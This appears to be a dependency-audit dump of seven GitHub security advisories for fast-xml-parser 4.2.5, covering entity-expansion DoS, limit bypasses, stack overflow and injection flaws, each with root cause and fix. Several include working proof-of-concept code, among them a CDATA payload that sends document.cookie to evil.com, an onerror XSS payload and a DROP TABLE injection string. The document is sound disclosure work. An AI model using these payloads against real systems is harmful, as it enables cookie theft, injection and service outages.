@@ -1,0 +1,633 @@
+===== GHSA-474x-hrwr-fgx4 | low | cvss 3.7 CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L | CVE-2026-126066
+TITLE: fast-xml-parser: Quadratic CPU consumption scanning unterminated stop-node tags
+RANGES: <=5.11.2 (installed 4.2.5)
+PATCHED: >=5.12.0
+
+### Summary
+
+With the non-default stopNodes option, a stop node's body with many "<a " fragments and no closing ">" anywhere after makes readStopNodeData() rescan the entire remaining input from every "<". The failed lookahead is neither cached nor bounded, so n fragments cost O(n²) before the parser throws. Availability-only (CPU exhaustion), needs the non-default stopNodes option — not benchmarked yet, see Proof of Concept.
+
+### Details
+
+**CWE-407** — Inefficient Algorithmic Complexity
+
+**Code**
+- `OrderedObjParser.js:520` — `parseXml()` calls `readStopNodeData()` after a matching stop node opens
+- `OrderedObjParser.js:810` — calls `readTagExp()` for every non-special `<`
+- `OrderedObjParser.js:688-722` — `tagExpWithClosingIndex()` scans to end-of-input and returns `undefined` when no `>` exists
+- `OrderedObjParser.js:812-818` — on failure, `i` isn't advanced, so the next `<` repeats the same full scan
+- `OrderedObjParser.js:423` — the main parse loop throws immediately on the same failure; only the stop-node path retries
+
+**Root cause:** a failed closing-`>` lookahead is neither cached nor bounded — `n` copies of `<a ` with no later `>` means `n` scans over the remaining input, O(n²) work, before it finally throws.
+
+**Fix**
+1. Throw immediately in `readStopNodeData()` when `readTagExp()` returns `undefined`
+2. Or break the loop on the first failed scan
+3. Or find the next `>` once and reuse/bound that result
+4. Add a test asserting near-linear scaling when payload size doubles
+
+### Proof of concept
+
+Not benchmarked — static-analysis finding, confidence 0.5.
+
+To confirm: configure `stopNodes` matching a root element. Build input as `'<stop>' + '<a '.repeat(n)`. Time `parse()` until it throws `Unexpected end of <tag>`. Start around n=10,000 and double it — quadratic should show ~4x time per doubling, linear ~2x. Control: same input with a `>` present, or `stopNodes` unset.
+
+### Impact
+
+CPU-exhaustion DoS in Node.js services parsing untrusted XML with `stopNodes` enabled. A ~100KB payload is estimated at ~10⁹ character operations (roughly a second or more of blocked event loop) — analytical estimate, not a benchmark. No confidentiality/integrity impact. CVSS 3.1: `AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L` (3.7, Low).
+
+===== GHSA-8gc5-j5rx-235r | high | cvss 7.5 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H | CVE-2026-33036
+TITLE: fast-xml-parser affected by numeric entity expansion bypassing all entity expansion limits (incomplete fix for CVE-2026-26278)
+RANGES: >=4.0.0-beta.3 <4.5.5 (installed 4.2.5)
+PATCHED: >=4.5.5
+
+## Summary
+
+The fix for CVE-2026-26278 added entity expansion limits (`maxTotalExpansions`, `maxExpandedLength`, `maxEntityCount`, `maxEntitySize`) to prevent XML entity expansion Denial of Service. However, these limits are only enforced for DOCTYPE-defined entities. **Numeric character references** (`&#NNN;` and `&#xHH;`) and standard XML entities (`&lt;`, `&gt;`, etc.) are processed through a separate code path that does NOT enforce any expansion limits.
+
+An attacker can use massive numbers of numeric entity references to completely bypass all configured limits, causing excessive memory allocation and CPU consumption.
+
+## Affected Versions
+
+fast-xml-parser v5.x through v5.5.3 (and likely v5.5.5 on npm)
+
+## Root Cause
+
+In `src/xmlparser/OrderedObjParser.js`, the `replaceEntitiesValue()` function has two separate entity replacement loops:
+
+1. **Lines 638-670**: DOCTYPE entities — expansion counting with `entityExpansionCount` and `currentExpandedLength` tracking. This was the CVE-2026-26278 fix.
+2. **Lines 674-677**: `lastEntities` loop — replaces standard entities including `num_dec` (`/&#([0-9]{1,7});/g`) and `num_hex` (`/&#x([0-9a-fA-F]{1,6});/g`). **This loop has NO expansion counting at all.**
+
+The numeric entity regex replacements at lines 97-98 are part of `lastEntities` and go through the uncounted loop, completely bypassing the CVE-2026-26278 fix.
+
+## Proof of Concept
+
+```javascript
+const { XMLParser } = require('fast-xml-parser');
+
+// Even with strict explicit limits, numeric entities bypass them
+const parser = new XMLParser({
+  processEntities: {
+    enabled: true,
+    maxTotalExpansions: 10,
+    maxExpandedLength: 100,
+    maxEntityCount: 1,
+    maxEntitySize: 10
+  }
+});
+
+// 100K numeric entity references — should be blocked by maxTotalExpansions=10
+const xml = `<root>${'&#65;'.repeat(100000)}</root>`;
+const result = parser.parse(xml);
+
+// Output: 500,000 chars — bypasses maxExpandedLength=100 completely
+console.log('Output length:', result.root.length);  // 500000
+console.log('Expected max:', 100);  // limit was 100
+```
+
+**Results:**
+- 100K `&#65;` references → 500,000 char output (5x default maxExpandedLength of 100,000)
+- 1M references → 5,000,000 char output, ~147MB memory consumed
+- Even with `maxTotalExpansions=10` and `maxExpandedLength=100`, 10K references produce 50,000 chars
+- Hex entities (`&#x41;`) exhibit the same bypass
+
+## Impact
+
+**Denial of Service** — An attacker who can provide XML input to applications using fast-xml-parser can cause:
+- Excessive memory allocation (147MB+ for 1M entity references)
+- CPU consumption during regex replacement
+- Potential process crash via OOM
+
+This is particularly dangerous because the application developer may have explicitly configured strict entity expansion limits believing they are protected, while numeric entities silently bypass all of them.
+
+## Suggested Fix
+
+Apply the same `entityExpansionCount` and `currentExpandedLength` tracking to the `lastEntities` loop (lines 674-677) and the HTML entities loop (lines 680-686), similar to how DOCTYPE entities are tracked at lines 638-670.
+
+## Workaround
+
+Set `htmlEntities:false`
+
+===== GHSA-fj3w-jwp8-x2g3 | low | cvss 0  | CVE-2026-27942
+TITLE: fast-xml-parser has stack overflow in XMLBuilder with preserveOrder
+RANGES: >=4.0.0-beta.0 <4.5.4 (installed 4.2.5)
+PATCHED: >=4.5.4
+
+### Impact
+Application crashes with stack overflow when user use XML builder with `prserveOrder:true` for following or similar input 
+
+```
+[{
+    'foo': [
+        { 'bar': [{ '@_V': 'baz' }] }
+    ]
+}]
+```
+
+Cause: `arrToStr` was not validating if the input is an array or a string and treating all non-array values as text content.
+_What kind of vulnerability is it? Who is impacted?_
+
+### Patches
+Yes in 5.3.8
+
+### Workarounds
+Use XML builder with `preserveOrder:false` or check the input data before passing to builder.
+
+### References
+[_Are there any links users can visit to find out more?_](https://github.com/NaturalIntelligence/fast-xml-parser/pull/791)
+
+===== GHSA-gh4j-gqv2-49f6 | moderate | cvss 6.1 CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N | CVE-2026-41650
+TITLE: fast-xml-parser XMLBuilder: XML Comment and CDATA Injection via Unescaped Delimiters
+RANGES: <4.5.7 (installed 4.2.5)
+PATCHED: >=4.5.7
+
+# fast-xml-parser XMLBuilder: Comment and CDATA Injection via Unescaped Delimiters
+
+## Summary
+
+fast-xml-parser v5.5.12 (latest) XMLBuilder does not escape the `-->` sequence in comment content or the `]]>` sequence in CDATA sections when building XML from JavaScript objects. This allows XML injection when user-controlled data flows into comments or CDATA elements, leading to XSS, SOAP injection, or data manipulation.
+
+Existing CVEs for fast-xml-parser cover different issues:
+- CVE-2023-26920: Prototype pollution (parser)
+- CVE-2023-34104: ReDoS (parser)
+- CVE-2026-27942: Stack overflow in XMLBuilder with preserveOrder
+- CVE-2026-25896: Entity encoding bypass via regex in DOCTYPE entities
+
+This finding covers **unescaped comment/CDATA delimiters in XMLBuilder** - a distinct vulnerability.
+
+## Vulnerable Code
+
+**File**: `src/fxb.js`
+
+```javascript
+// Line 442 - Comment building with NO escaping of -->
+buildTextValNode(val, key, attrStr, level) {
+    // ...
+    if (key === this.options.commentPropName) {
+        return this.indentate(level) + `<!--${val}-->` + this.newLine;  // VULNERABLE
+    }
+    // ...
+    if (key === this.options.cdataPropName) {
+        return this.indentate(level) + `<![CDATA[${val}]]>` + this.newLine;  // VULNERABLE
+    }
+}
+```
+
+Compare with attribute/text escaping which IS properly handled via `replaceEntitiesValue()`.
+
+## Proof of Concept
+
+### Test 1: Comment Injection (XSS in SVG/HTML context)
+
+```javascript
+import { XMLBuilder } from 'fast-xml-parser';
+
+const builder = new XMLBuilder({
+  commentPropName: "#comment",
+  format: true,
+  suppressEmptyNode: true
+});
+
+const xml = {
+  root: {
+    "#comment": "--><script>alert('XSS')</script><!--",
+    data: "legitimate content"
+  }
+};
+
+console.log(builder.build(xml));
+```
+
+**Output**:
+```xml
+<root>
+  <!----><script>alert('XSS')</script><!---->
+  <data>legitimate content</data>
+</root>
+```
+
+### Test 2: CDATA Injection (RSS feed)
+
+```javascript
+const builder = new XMLBuilder({
+  cdataPropName: "#cdata",
+  format: true,
+  suppressEmptyNode: true
+});
+
+const rss = {
+  rss: { channel: { item: {
+    title: "Article",
+    description: {
+      "#cdata": "Content]]><script>fetch('https://evil.com/'+document.cookie)</script><![CDATA[more"
+    }
+  }}}
+};
+
+console.log(builder.build(rss));
+```
+
+**Output**:
+```xml
+<rss>
+  <channel>
+    <item>
+      <title>Article</title>
+      <description>
+        <![CDATA[Content]]><script>fetch('https://evil.com/'+document.cookie)</script><![CDATA[more]]>
+      </description>
+    </item>
+  </channel>
+</rss>
+```
+
+### Test 3: SOAP Message Injection
+
+```javascript
+const builder = new XMLBuilder({
+  commentPropName: "#comment",
+  format: true
+});
+
+const soap = {
+  "soap:Envelope": {
+    "soap:Body": {
+      "#comment": "Request from user: --><soap:Body><Action>deleteAll</Action></soap:Body><!--",
+      Action: "getBalance",
+      UserId: "12345"
+    }
+  }
+};
+
+console.log(builder.build(soap));
+```
+
+**Output**:
+```xml
+<soap:Envelope>
+  <soap:Body>
+    <!--Request from user: --><soap:Body><Action>deleteAll</Action></soap:Body><!---->
+    <Action>getBalance</Action>
+    <UserId>12345</UserId>
+  </soap:Body>
+</soap:Envelope>
+```
+
+The injected `<Action>deleteAll</Action>` appears as a real SOAP action element.
+
+## Tested Output
+
+All tests run on Node.js v22, fast-xml-parser v5.5.12:
+
+```
+1. COMMENT INJECTION:
+   Injection successful: true
+
+2. CDATA INJECTION (RSS feed scenario):
+   Injection successful: true
+
+4. Round-trip test:
+   Injection present: true
+
+5. SOAP MESSAGE INJECTION:
+   Contains injected Action: true
+```
+
+## Impact
+
+An attacker who controls data that flows into XML comments or CDATA sections via XMLBuilder can:
+
+1. **XSS**: Inject `<script>` tags into XML/SVG/HTML documents served to browsers
+2. **SOAP injection**: Modify SOAP message structure by injecting XML elements
+3. **RSS/Atom feed poisoning**: Inject scripts into RSS feed items via CDATA breakout
+4. **XML document manipulation**: Break XML structure by escaping comment/CDATA context
+
+This is practically exploitable whenever applications use XMLBuilder to generate XML from data that includes user-controlled content in comments or CDATA (e.g., RSS feeds, SOAP services, SVG generation, config files).
+
+## Suggested Fix
+
+Escape delimiters in comment and CDATA content:
+
+```javascript
+// For comments: replace -- with escaped equivalent
+if (key === this.options.commentPropName) {
+    const safeVal = String(val).replace(/--/g, '&#45;&#45;');
+    return this.indentate(level) + `<!--${safeVal}-->` + this.newLine;
+}
+
+// For CDATA: split on ]]> and rejoin with separate CDATA sections
+if (key === this.options.cdataPropName) {
+    const safeVal = String(val).replace(/]]>/g, ']]]]><![CDATA[>');
+    return this.indentate(level) + `<![CDATA[${safeVal}]]>` + this.newLine;
+}
+```
+
+===== GHSA-jmr7-xgp7-cmfj | high | cvss 7.5 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H | CVE-2026-26278
+TITLE: fast-xml-parser affected by DoS through entity expansion in DOCTYPE (no expansion limit)
+RANGES: >=4.1.3 <4.5.4 (installed 4.2.5)
+PATCHED: >=4.5.4
+
+### Summary
+The XML parser can be forced to do an unlimited amount of entity expansion. With a very small XML input, it’s possible to make the parser spend seconds or even minutes processing a single request, effectively freezing the application.
+
+### Details
+There is a check in `DocTypeReader.js` that tries to prevent entity expansion attacks by rejecting entities that reference other entities (it looks for & inside entity values). This does stop classic “Billion Laughs” payloads.
+
+However, it doesn’t stop a much simpler variant.
+
+If you define one large entity that contains only raw text (no & characters) and then reference it many times, the parser will happily expand it every time. There is no limit on how large the expanded result can become, or how many replacements are allowed.
+
+The problem is in `replaceEntitiesValue()` inside `OrderedObjParser.js`. It repeatedly runs `val.replace()` in a loop, without any checks on total output size or execution cost. As the entity grows or the number of references increases, parsing time explodes.
+
+Relevant code:
+
+`DocTypeReader.js` (lines 28–33): entity registration only checks for &
+
+`OrderedObjParser.js` (lines 439–458): entity replacement loop with no limits
+
+### PoC
+
+```js
+const { XMLParser } = require('fast-xml-parser');
+
+const entity = 'A'.repeat(1000);
+const refs = '&big;'.repeat(100);
+const xml = `<!DOCTYPE foo [<!ENTITY big "${entity}">]><root>${refs}</root>`;
+
+console.time('parse');
+new XMLParser().parse(xml); // ~4–8 seconds for ~1.3 KB of XML
+console.timeEnd('parse');
+
+// 5,000 chars × 100 refs takes 200+ seconds
+// 50,000 chars × 1,000 refs will hang indefinitely
+```
+
+### Impact
+This is a straightforward denial-of-service issue.
+
+Any service that parses user-supplied XML using the default configuration is vulnerable. Since Node.js runs on a single thread, the moment the parser starts expanding entities, the event loop is blocked. While this is happening, the server can’t handle any other requests.
+
+In testing, a payload of only a few kilobytes was enough to make a simple HTTP server completely unresponsive for several minutes, with all other requests timing out.
+
+### Workaround
+
+Avoid using DOCTYPE parsing by `processEntities: false` option.
+
+===== GHSA-jp2q-39xq-3w4g | moderate | cvss 5.9 CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H | CVE-2026-33349
+TITLE: Entity Expansion Limits Bypassed When Set to Zero Due to JavaScript Falsy Evaluation in fast-xml-parser
+RANGES: >=4.0.0-beta.3 <4.5.5 (installed 4.2.5)
+PATCHED: >=4.5.5
+
+## Summary
+
+The `DocTypeReader` in fast-xml-parser uses JavaScript truthy checks to evaluate `maxEntityCount` and `maxEntitySize` configuration limits. When a developer explicitly sets either limit to `0` — intending to disallow all entities or restrict entity size to zero bytes — the falsy nature of `0` in JavaScript causes the guard conditions to short-circuit, completely bypassing the limits. An attacker who can supply XML input to such an application can trigger unbounded entity expansion, leading to memory exhaustion and denial of service.
+
+## Details
+
+The `OptionsBuilder.js` correctly preserves a user-supplied value of `0` using nullish coalescing (`??`):
+
+```js
+// src/xmlparser/OptionsBuilder.js:111
+maxEntityCount: value.maxEntityCount ?? 100,
+// src/xmlparser/OptionsBuilder.js:107
+maxEntitySize: value.maxEntitySize ?? 10000,
+```
+
+However, `DocTypeReader.js` uses truthy evaluation to check these limits. Because `0` is falsy in JavaScript, the entire guard expression short-circuits to `false`, and the limit is never enforced:
+
+```js
+// src/xmlparser/DocTypeReader.js:30-32
+if (this.options.enabled !== false &&
+    this.options.maxEntityCount &&          // ← 0 is falsy, skips check
+    entityCount >= this.options.maxEntityCount) {
+    throw new Error(`Entity count ...`);
+}
+```
+
+```js
+// src/xmlparser/DocTypeReader.js:128-130
+if (this.options.enabled !== false &&
+    this.options.maxEntitySize &&            // ← 0 is falsy, skips check
+    entityValue.length > this.options.maxEntitySize) {
+    throw new Error(`Entity "${entityName}" size ...`);
+}
+```
+
+The execution flow is:
+
+1. Developer configures `processEntities: { maxEntityCount: 0, maxEntitySize: 0 }` intending to block all entity definitions.
+2. `OptionsBuilder.normalizeProcessEntities` preserves the `0` values via `??` (correct behavior).
+3. Attacker supplies XML with a DOCTYPE containing many large entities.
+4. `DocTypeReader.readDocType` evaluates `this.options.maxEntityCount && ...` — since `0` is falsy, the entire condition is `false`.
+5. `DocTypeReader.readEntityExp` evaluates `this.options.maxEntitySize && ...` — same result.
+6. All entity count and size limits are bypassed; entities are parsed without restriction.
+
+## PoC
+
+```js
+const { XMLParser } = require("fast-xml-parser");
+
+// Developer intends: "no entities allowed at all"
+const parser = new XMLParser({
+  processEntities: {
+    enabled: true,
+    maxEntityCount: 0,    // should mean "zero entities allowed"
+    maxEntitySize: 0       // should mean "zero-length entities only"
+  }
+});
+
+// Generate XML with many large entities
+let entities = "";
+for (let i = 0; i < 1000; i++) {
+  entities += `<!ENTITY e${i} "${"A".repeat(100000)}">`;
+}
+
+const xml = `<?xml version="1.0"?>
+<!DOCTYPE foo [
+  ${entities}
+]>
+<foo>&e0;</foo>`;
+
+// This should throw "Entity count exceeds maximum" but does not
+try {
+  const result = parser.parse(xml);
+  console.log("VULNERABLE: parsed without error, entities bypassed limits");
+} catch (e) {
+  console.log("SAFE:", e.message);
+}
+
+// Control test: setting maxEntityCount to 1 correctly blocks
+const safeParser = new XMLParser({
+  processEntities: {
+    enabled: true,
+    maxEntityCount: 1,
+    maxEntitySize: 100
+  }
+});
+
+try {
+  safeParser.parse(xml);
+  console.log("ERROR: should have thrown");
+} catch (e) {
+  console.log("CONTROL:", e.message);  // "Entity count (2) exceeds maximum allowed (1)"
+}
+```
+
+**Expected output:**
+```
+VULNERABLE: parsed without error, entities bypassed limits
+CONTROL: Entity count (2) exceeds maximum allowed (1)
+```
+
+## Impact
+
+- **Denial of Service:** An attacker supplying crafted XML with thousands of large entity definitions can exhaust server memory in applications where the developer configured `maxEntityCount: 0` or `maxEntitySize: 0`, intending to prohibit entities entirely.
+- **Security control bypass:** Developers who explicitly set restrictive limits to `0` receive no protection — the opposite of their intent. This creates a false sense of security.
+- **Scope:** Only applications that explicitly set these limits to `0` are affected. The default configuration (`maxEntityCount: 100`, `maxEntitySize: 10000`) is not vulnerable. The `enabled: false` option correctly disables entity processing entirely and is not affected.
+
+## Recommended Fix
+
+Replace the truthy checks in `DocTypeReader.js` with explicit type checks that correctly treat `0` as a valid numeric limit:
+
+```js
+// src/xmlparser/DocTypeReader.js:30-32 — replace:
+if (this.options.enabled !== false &&
+    this.options.maxEntityCount &&
+    entityCount >= this.options.maxEntityCount) {
+
+// with:
+if (this.options.enabled !== false &&
+    typeof this.options.maxEntityCount === 'number' &&
+    entityCount >= this.options.maxEntityCount) {
+```
+
+```js
+// src/xmlparser/DocTypeReader.js:128-130 — replace:
+if (this.options.enabled !== false &&
+    this.options.maxEntitySize &&
+    entityValue.length > this.options.maxEntitySize) {
+
+// with:
+if (this.options.enabled !== false &&
+    typeof this.options.maxEntitySize === 'number' &&
+    entityValue.length > this.options.maxEntitySize) {
+```
+
+# Workaround
+
+If you don't want to processed the entities, keep the processEntities flag to false instead of setting any limit to 0.
+
+===== GHSA-m7jm-9gc2-mpf2 | critical | cvss 9.3 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:N | CVE-2026-25896
+TITLE: fast-xml-parser has an entity encoding bypass via regex injection in DOCTYPE entity names
+RANGES: >=4.1.3 <4.5.4 (installed 4.2.5)
+PATCHED: >=4.5.4
+
+# Entity encoding bypass via regex injection in DOCTYPE entity names
+
+## Summary
+
+A dot (`.`) in a DOCTYPE entity name is treated as a regex wildcard during entity replacement, allowing an attacker to shadow built-in XML entities (`&lt;`, `&gt;`, `&amp;`, `&quot;`, `&apos;`) with arbitrary values. This bypasses entity encoding and leads to XSS when parsed output is rendered.
+
+## Details
+
+The fix for CVE-2023-34104 addressed some regex metacharacters in entity names but missed `.` (period), which is valid in XML names per the W3C spec.
+
+In `DocTypeReader.js`, entity names are passed directly to `RegExp()`:
+
+```js
+entities[entityName] = {
+    regx: RegExp(`&${entityName};`, "g"),
+    val: val
+};
+```
+
+An entity named `l.` produces the regex `/&l.;/g` where `.` matches **any character**, including the `t` in `&lt;`. Since DOCTYPE entities are replaced before built-in entities, this shadows `&lt;` entirely.
+
+The same issue exists in `OrderedObjParser.js:81` (`addExternalEntities`), and in the v6 codebase - `EntitiesParser.js` has a `validateEntityName` function with a character blacklist, but `.` is not included:
+
+```js
+// v6 EntitiesParser.js line 96
+const specialChar = "!?\\/[]$%{}^&*()<>|+";  // no dot
+```
+
+## Shadowing all 5 built-in entities
+
+| Entity name | Regex created | Shadows |
+|---|---|---|
+| `l.` | `/&l.;/g` | `&lt;` |
+| `g.` | `/&g.;/g` | `&gt;` |
+| `am.` | `/&am.;/g` | `&amp;` |
+| `quo.` | `/&quo.;/g` | `&quot;` |
+| `apo.` | `/&apo.;/g` | `&apos;` |
+
+## PoC
+
+```js
+const { XMLParser } = require("fast-xml-parser");
+
+const xml = `<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY l. "<img src=x onerror=alert(1)>">
+]>
+<root>
+  <text>Hello &lt;b&gt;World&lt;/b&gt;</text>
+</root>`;
+
+const result = new XMLParser().parse(xml);
+console.log(result.root.text);
+// Hello <img src=x onerror=alert(1)>b>World<img src=x onerror=alert(1)>/b>
+```
+
+No special parser options needed - `processEntities: true` is the default.
+
+When an app renders `result.root.text` in a page (e.g. `innerHTML`, template interpolation, SSR), the injected `<img onerror>` fires.
+
+`&amp;` can be shadowed too:
+
+```js
+const xml2 = `<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY am. "'; DROP TABLE users;--">
+]>
+<root>SELECT * FROM t WHERE name='O&amp;Brien'</root>`;
+
+const r = new XMLParser().parse(xml2);
+console.log(r.root);
+// SELECT * FROM t WHERE name='O'; DROP TABLE users;--Brien'
+```
+
+## Impact
+
+This is a complete bypass of XML entity encoding. Any application that parses untrusted XML and uses the output in HTML, SQL, or other injection-sensitive contexts is affected.
+
+- Default config, no special options
+- Attacker can replace any `&lt;` / `&gt;` / `&amp;` / `&quot;` / `&apos;` with arbitrary strings
+- Direct XSS vector when parsed XML content is rendered in a page
+- v5 and v6 both affected
+
+## Suggested fix
+
+Escape regex metacharacters before constructing the replacement regex:
+
+```js
+const escaped = entityName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+entities[entityName] = {
+    regx: RegExp(`&${escaped};`, "g"),
+    val: val
+};
+```
+
+For v6, add `.` to the blacklist in `validateEntityName`:
+
+```js
+const specialChar = "!?\\/[].{}^&*()<>|+";
+```
+
+## Severity
+
+**CWE-185** (Incorrect Regular Expression)
+
+**CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:N - 9.3 (CRITICAL)**
+
+Entity decoding is a fundamental trust boundary in XML processing. This completely undermines it with no preconditions.
+
